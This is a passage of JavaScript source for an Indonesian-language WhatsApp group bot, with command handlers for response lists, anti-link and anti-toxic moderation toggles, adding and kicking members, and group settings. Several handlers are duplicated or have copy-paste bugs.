      teks += `- ${i.key.toUpperCase()}\n`
    }
  }
  teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada Didalam list respon. Misal ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} Kepada Bot`
  Alice.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender]
  }, {
    quoted: m
  })
}
break

case 'addlist':
if (!m.isGroup) return XRG()
if (!isAdmins) return XRA()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${XyrooRynzz} key|respon\n\nContoh: ${XyrooRynzz} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await Alice.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      addResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Sukses addlist respon\nKey: ${args1}`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  addResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return XRG()
if (!isAdmins) return XRA()
if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
if (!text) return reply(`Gunakan dengan xara ${XyrooRynzz} key\n\nContoh: ${XyrooRynzz} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses dellist respon dengan key: ${q}`)
break

case 'update':
case 'updatelist':
if (!m.isGroup) return XRG()
if (!isAdmins) return XRA()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${XyrooRynzz} key|respon\n\nContoh: ${XyrooRynzz} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await Alice.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      updateResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Berhasil update respon list dengan key *${args1}*`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Berhasil update respon list dengan key *${args1}*`)
}
break

case 'afk': {
  if (!m.isGroup) return XRG()
  if (m.key.fromMe) return reply('Bot tidak dapat AFK')
  if (isAfkOn) return reply('AFK sudah diaktifkan sebelumnya')
  let reason = text ? text : 'Tidak ada.'
  afk.addAfkUser(m.sender, Date.now(), reason, _afk)
  Alice.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang AFK\nAlasan: ${reason}`, xy)
}
break

case 'addbadwords': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (!text) return reply(`Penggunaan ${XyrooRynzz} anjing`)
addbadwords(text)
}
break

case 'deletebadwords': case 'delbadwords': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (!text) return reply(`Penggunaan ${XyrooRynzz} anjing`)
deletebadwords(text)
}
break

case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiVirtex) return reply('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiVirtex) return reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return reply('_Sudah Diaktifkan_')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return reply('_Sudah Diaktifkan_')
ntilinkytch.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkInstagram) return reply('_Sudah Diaktifkan_')
ntilinkig.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(m.chat)
ntilinkig.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinkbokep':{
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiDewasa) return reply('_Sudah Diaktifkan_')
ntilinkdewasa.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link dewasa di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiDewasa) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkdewasa.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
case 'antilinkterabox':{
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiTerabox) return reply('_Sudah Diaktifkan_')
ntilinkterabox.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Terabox di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkterabox.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkmediafire':{
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiMediafire) return reply('_Sudah Diaktifkan_')
ntilink.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Mediafire di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiMediafire) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkmediafire.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkfacebook':{
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}

break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkTiktok) return reply('_Sudah Diaktifkan_')
ntilinktt.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('_Sudah Diaktifkan_')
ntilinktwt.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkall': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antitoxic': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiToxic) return reply('_Sudah Diaktifkan_')
nttoxic.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json', JSON.stringify(nttoxic))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang diperbolehkan menggunakan kata-kata buruk di grup ini, yang menggunakan akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiToxic) return reply('_Sudah Dimatikan_')
let off = nttoxic.indexOf(m.chat)
nttoxic.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json', JSON.stringify(nttoxic))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antiasing":{
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiAsing) return reply('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antiwame': {
if (!m.isGroup) return XRG()
if (!isBotAdmins) return XRBADM()
if (!isAdmins) return XRA()
if (args[0] === "on") {
if (AntiWame) return reply('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wame di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiWame) return reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antitoxic":{
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return reply('Sudah Aktif')
wlcmm.push(m.chat)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!welcmm) return reply('Sudah Non Aktif')
let off = wlcmm.indexOf(m.chat)
wlcmm.splice(off, 1)
reply('Sukses Mematikan Anti Toxic  di group ini')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'add':
case 'tambahmem':
case 'addmem': {
  if (!m.isGroup) return XRG()
  if (!isAdmins && !isOwner) return XRA()

  let users;
  if (m.quoted) {
    users = m.quoted.sender
  } else if (text) {
    let number = text.replace(/[^0-9]/g, '')
    if (number.length < 8) return reply('❌ Nomor tidak valid!')
    users = number + '@s.whatsapp.net'
  } else {
    return reply('❌ Masukkan nomor atau reply pesan dari orang yang ingin ditambahkan.')
  }

  const groupData = await Alice.groupMetadata(m.chat)
  const groupMembers = groupData.participants
  const isUserInGroup = groupMembers.some(member => member.id === users)
  if (isUserInGroup) return reply('❌ Pengguna sudah ada di grup.')

  try {
    await Alice.groupParticipantsUpdate(m.chat, [users], 'add')
    return reply(`✅ Berhasil menambahkan @${users.split('@')[0]}`, { mentions: [users] })
  } catch (err) {
    console.error('[❌ Add Error]:', err)

    try {
      const inviteCode = await Alice.groupInviteCode(m.chat)
      const groupName = groupData.subject || 'grup ini'
      const link = `https://chat.whatsapp.com/${inviteCode}`

      await Alice.sendMessage(users, {
        text: `👋 Hai! Admin mengundang kamu untuk bergabung ke grup *${groupName}*\n\nKlik link berikut untuk bergabung:\n${link}`
      })

      return reply(`❌ Gagal ditambahkan langsung. Link undangan sudah dikirim ke @${users.split('@')[0]}`, { mentions: [users] })
    } catch (inviteErr) {
      console.error('[❌ Invite Error]:', inviteErr)
      return reply('❌ Gagal menambahkan dan mengirim link undangan.')
    }
  }
}
break

case 'kick': {
  if (!m.isGroup) return reply('⛔ Hanya bisa digunakan dalam grup.')
  if (!isAdmins && !isOwner) return reply('⛔ Hanya admin yang bisa menendang.')

  let target

  if (m.mentionedJid.length > 0) {
    target = m.mentionedJid[0]
  } else if (m.quoted) {
    target = m.quoted.sender
  } else if (text) {
    let number = text.replace(/[^0-9]/g, '') // hilangkan non-digit
    target = number + '@s.whatsapp.net'
  }

  if (!target) return reply('⚠️ Masukkan nomor/mention/reply member yang ingin di-kick.')

  try {
    await Alice.groupParticipantsUpdate(m.chat, [target], 'remove')
    reply(`✅ Berhasil mengeluarkan: @${target.split('@')[0]}`, { mentions: [target] })
  } catch (e) {
    console.log('❌ Error kick:', e)
    reply('❌ Gagal mengeluarkan member. Pastikan target bukan admin.')
  }
  break
}

case "promote":{
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (!text && !m.quoted) return reply('masukkan nomor yang ingin di promote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Alice.groupParticipantsUpdate(m.chat, [users], 'promote').catch(console.log)
}
break

case "demote":{
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (!text && !m.quoted) return reply('masukkan nomor yang ingin di demote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Alice.groupParticipantsUpdate(m.chat, [users], 'demote').catch(console.log)
}
break

case 'gc': { 
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (args[0] === 'close'){
await Alice.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await Alice.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
 reply(`Silahkan Ketik ${XyrooRynzz} open/ ${XyrooRynzz} close`)
 }
}
break

case 'editinfo': {
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (!isBotAdmins) return XRBADM
 if (args[0] === 'open'){
await Alice.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await Alice.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 reply(`Silahkan Ketik ${XyrooRynzz} open/ ${XyrooRynzz} close`)
}
}
break

case 'join': {
if (!isOwner) return reply('Khusus Owner Bot')
if (!text) return reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Alice.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'leave': {
if (!isOwner) return XRO()
reply("Aku Pergi :v")
await Alice.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'h':
case 'hidetag': {
  if (!m.isGroup) return XRG()
  if (!isOwner && !isAdmins) return XRA()
  if (m.quoted) {
    Alice.sendMessage(m.chat, {
      forward: m.quoted.fakeObj,
      mentions: participants.map(a => a.id)
    })
  }
  if (!m.quoted) {
    Alice.sendMessage(m.chat, {
      text: q ? q : '',
